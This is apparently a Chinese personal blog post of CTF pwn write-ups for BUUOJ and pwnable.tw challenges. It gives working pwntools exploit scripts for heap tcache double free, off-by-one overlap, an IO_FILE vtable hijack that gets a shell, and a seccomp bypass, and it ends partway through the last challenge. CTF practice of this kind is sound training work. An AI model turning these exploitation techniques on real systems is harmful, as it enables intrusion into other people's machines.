<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    BUU刷题集 |
    
    The lair of C0yo7e</title>
  
    <link rel="shortcut icon" href="/images/time.png">
  
  <link rel="stylesheet" href="/css/style.css">
  
    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
  
  <script src="/js/pace.min.js"></script>
</head>
</html>
<body>
<main class="content">
  <section class="outer">
  

<article id="post-BUU刷题集" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      BUU刷题集
    </h1>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/08/02/BUU刷题集/" class="article-date">
  <time datetime="2020-08-02T01:02:00.000Z" itemprop="datePublished">2020-08-02</time>
</a>
        
      </div>
    

    
      
    <div class="tocbot"></div>





    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>之前一直有说要刷buu，但一直没怎么行动，今天开始，要好好刷题了!<br>这篇blog将持续不定时更新（如果能日更就好了）<br>啊宁！冲呀！</p>
<a id="more"></a>
<h3 id="mrctf2020-spfa"><a href="#mrctf2020-spfa" class="headerlink" title="mrctf2020-spfa"></a>mrctf2020-spfa</h3><p>这题其实刚开始看到我就觉得是算法题（曾经被最短路径折磨得不清啊</p>
<p>仔细看代码，发现程序有一个判断，两节点之间的路径&gt;=两节点通过第三结点连接的路径的话就会给两节点附上两路径之和。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( s[v7] &gt;= s[v6] + len[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        s[v7] = len[i] + s[v6];</span><br><span class="line">        <span class="keyword">if</span> ( !v9[v7] )</span><br><span class="line">        &#123;</span><br><span class="line">          v9[v7] = <span class="number">1</span>;</span><br><span class="line">          qu[v4++] = v7;</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt; <span class="number">1000</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"queue overflow error!"</span>);</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v10;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>如果路径长度都为0，则可陷入循环，直至qu[1000]，而这个位置刚好是flag的位置，所以覆写-1为0，就可以绕过代码，直接getshell</p>
<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./mrctf2020_spfa")</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26483</span>)</span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'1'</span> + <span class="string">" "</span> + <span class="string">'2'</span> + <span class="string">" "</span> + <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'2'</span> + <span class="string">" "</span> + <span class="string">'1'</span> + <span class="string">" "</span> + <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'1'</span> + <span class="string">" "</span> + <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">":\n"</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwnable-seethefile"><a href="#pwnable-seethefile" class="headerlink" title="pwnable_seethefile"></a>pwnable_seethefile</h3><p>open文件对文件的操作的pwn题我第一次见（一看就是刷题太少），感觉蛮有趣的，然后只好看大佬的wp，发现又是IO_FILE的利用，好像还是属于栈溢出</p>
<p>由于可以直接读文件，利用linux的proc伪文件系统读取<code>/proc/self/maps</code>即可获得libc基址（可能要两遍，主要是看.so的吧）<br>然后要伪造IO_FILE劫持vtable，使调用fclose的时候调用伪造的结构体</p>
<p>关于fclose的调用过程：<a href="https://www.jianshu.com/p/0176ebe02354" target="_blank" rel="noopener">https://www.jianshu.com/p/0176ebe02354</a></p>
<p>在检查<code>vtable_offset==0</code>之后函数对<code>fp-&gt;_flags</code>的<code>_IO_IS_FILEBUF</code>位进行检查，<code>_IO_IS_FILEBUF</code>如上文定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br></pre></td></tr></table></figure>

<p>若该位不为0则调用_IO_un_link(fp)将fp指向的FILE结构体从_IO_list_all的单向链表中取下，并调用_IO_file_close_it(fp)关闭fp。<br>然后将调用_IO_FINISH(fp)，相当于执行((struct IO_FILE_plus *)fp-&gt;vtable)-&gt;__finish(fp)</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">myelf  = ELF(<span class="string">"./seethefile"</span>)</span><br><span class="line">libc   = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io     = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10200</span>)</span><br><span class="line"></span><br><span class="line">sla          = <span class="keyword">lambda</span> delim,data       :io.sendlineafter(delim, data) </span><br><span class="line">openfile     = <span class="keyword">lambda</span> name :  (sla(<span class="string">"choice :"</span>,<span class="string">"1"</span>),sla(<span class="string">"see :"</span>,name))</span><br><span class="line">readfile     = <span class="keyword">lambda</span>      :  (sla(<span class="string">"choice :"</span>,<span class="string">"2"</span>))</span><br><span class="line">showfile     = <span class="keyword">lambda</span>      :  (sla(<span class="string">"choice :"</span>,<span class="string">"3"</span>))</span><br><span class="line">leave        = <span class="keyword">lambda</span> name :  (sla(<span class="string">"choice :"</span>,<span class="string">"5"</span>),sla(<span class="string">"ame :"</span>,name))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">openfile(<span class="string">"/proc/self/maps"</span>)</span><br><span class="line">readfile()</span><br><span class="line">showfile()</span><br><span class="line">io.recvuntil(<span class="string">"[heap]\n"</span>)</span><br><span class="line">libc_addr = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">system_addr = libc_addr +libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># make fake file</span></span><br><span class="line">fakeFILE = <span class="number">0x0804B284</span></span><br><span class="line">payload  = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(fakeFILE)</span><br><span class="line">payload += p32(<span class="number">0xffffdfff</span>)</span><br><span class="line">payload += <span class="string">";$0"</span>+<span class="string">'\x00'</span>*<span class="number">0x8d</span></span><br><span class="line">payload += p32(fakeFILE+<span class="number">0x98</span>)</span><br><span class="line">payload += p32(system_addr)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">leave(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/</a></p>
<h4 id="关于fclose的调用过程"><a href="#关于fclose的调用过程" class="headerlink" title="关于fclose的调用过程"></a>关于fclose的调用过程</h4><p><a href="https://www.jianshu.com/p/0176ebe02354" target="_blank" rel="noopener">https://www.jianshu.com/p/0176ebe02354</a></p>
<h3 id="V-amp-N2020-公开赛-easyTHeap"><a href="#V-amp-N2020-公开赛-easyTHeap" class="headerlink" title="[V&amp;N2020 公开赛]easyTHeap"></a>[V&amp;N2020 公开赛]easyTHeap</h3><p>这个是个最简单的tcache+double free<br>glibc2.27增加了简单tcache这个机制<br>就是先放进tcache的队列里，通过double free来使它进入unsorted bin队列来leak</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"> </span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">p=process(<span class="string">'./easyTHeap'</span>)</span><br><span class="line"><span class="comment"># p = remote('node3.buuoj.cn',26148)</span></span><br><span class="line">elf = ELF(<span class="string">'./easyTHeap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"size?"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"idx?"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x80)</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x260</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4 target</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> hex(__malloc_hook)</span><br><span class="line">realloc_hook=libc.sym[<span class="string">'__realloc_hook'</span>]+libc_base</span><br><span class="line">realloc = libc.symbols[<span class="string">'realloc'</span>]+libc_base</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x2000000000000</span>)+p64(<span class="number">0</span>)*<span class="number">20</span>+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># payload += p64(__malloc_hook)</span></span><br><span class="line">payload += p64(realloc_hook)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a38c</span></span><br><span class="line"><span class="comment"># 0x4f2c5, 0x4f322, 0x10a38c</span></span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget)+p64(realloc+<span class="number">4</span>) <span class="comment">#rsp+0x70 == null(0x0)</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line">debug(<span class="number">0x0b6f</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="新增知识点："><a href="#新增知识点：" class="headerlink" title="新增知识点："></a>新增知识点：</h4><p>通过这题是终于知道了onegadget那些个rsp+0x30=0或者null是什么了<br>就是在调用malloc之后，call sytem那个位置，看stack里面，是否满足rsp + 0x30(或者其他）和onegadget里面的条件一致，一致的话这个gadget就可行，不然就要再调用realloc，增加偏移，使他满足（跟进realloc里面看，找到realloc + xxx 的位置为0，即可）</p>
<h3 id="V-amp-N2020-公开赛-simpleheap"><a href="#V-amp-N2020-公开赛-simpleheap" class="headerlink" title="[V&amp;N2020 公开赛]simpleheap"></a>[V&amp;N2020 公开赛]simpleheap</h3><p>off by one的一道题</p>
<p>利用off by one可以改chunk size，构造overlap，free掉再add来leak libc，再free掉被重叠的一个堆块，然后再用另一个idx改fd为目标地址（即main_arena-0x23）再add两次就可以达到修改malloc为onegadget的目的了。</p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span>	</span><br><span class="line">	p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line">	p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'idx?'</span>,str(index))</span><br><span class="line">	p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'idx?'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span>		</span><br><span class="line">	p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'idx?'</span>,str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\n'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\n'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'\n'</span>) <span class="comment">#3</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x28</span> + <span class="string">'\xE1'</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\n'</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">'\x7F'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">log.success(<span class="string">'Main_Arena:\t'</span> + hex(main_arena))</span><br><span class="line">libcbase = main_arena - (libc.symbols[<span class="string">'__malloc_hook'</span>] + <span class="number">0x10</span>)</span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(<span class="string">'Malloc_Hook:\t'</span> + hex(malloc_hook))</span><br><span class="line">realloc = libcbase + <span class="number">0x846CC</span></span><br><span class="line">one_gadget = libcbase + <span class="number">0x4526A</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\n'</span>) <span class="comment">#4 -&gt;2</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload = p64(malloc_hook<span class="number">-0x23</span>)+<span class="string">'\n'</span></span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\x00'</span>*(<span class="number">0x13</span><span class="number">-8</span>) + p64(one_gadget)+p64(realloc)+<span class="string">'\n'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,<span class="string">'32'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="V-amp-N2020-公开赛-warmup"><a href="#V-amp-N2020-公开赛-warmup" class="headerlink" title="[V&amp;N2020 公开赛]warmup"></a>[V&amp;N2020 公开赛]warmup</h3><p>这题开了沙箱，然后用seccomp-tools看一下什么被禁了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">coyote@ubuntu:~/Yee/V&amp;N$ seccomp-tools dump ./vn_pwn_warmup</span><br><span class="line">This <span class="keyword">is</span> a easy challange <span class="keyword">for</span> you.</span><br><span class="line">Here <span class="keyword">is</span> my gift: <span class="number">0x7f41cd2fc690</span></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &gt;= <span class="number">0x40000000</span>) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != write) goto <span class="number">0010</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000024</span>  A = count &gt;&gt; <span class="number">32</span> <span class="comment"># write(fd, buf, count)</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) goto <span class="number">0010</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000020</span>  A = count <span class="comment"># write(fd, buf, count)</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  <span class="keyword">if</span> (A == <span class="number">0x10</span>) goto <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>

<p>发现execve被禁了，所以我们只能用orw来把flag打印出来</p>
<p>题目的两次输入是连着的，第二次是在第一次的前面，所以我们把orw写到第一次输入里面，在第二次输入的跳转地址处填入pop rdi，由于第一次输入的内容会pop到rdi中，在第二次输入执行完之后会执行pop rdi操作，即执行输入一里的内容，第一步是read（0，stack，0x8)，需要接收一个参数，所以我们再次发送“flag”这个字符过去。</p>
<p>先用read把“flag”字符读进stack的位置里面（environ是libc存储的栈地址），open的时候拿它当参数，打开文件夹，再用read把flag的内容传到stack+8的地址里</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fff6fee0268</span> —▸ <span class="number">0x7fc045b630c9</span> (__lll_unlock_wake_private+<span class="number">25</span>) ◂— pop    rdx</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fff6fee0270</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fff6fee0278</span> —▸ <span class="number">0x7fc045e14f40</span> (namelen) ◂— <span class="string">'flag&#123;1234567&#125;\n'</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fff6fee0280</span> —▸ <span class="number">0x7fc045b452b0</span> (write) ◂— cmp    dword ptr [rip + <span class="number">0x2d2489</span>], <span class="number">0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fff6fee0288</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">'aaaaaaaa'</span>)</span><br></pre></td></tr></table></figure>

<p>最后用write打印出来即可</p>
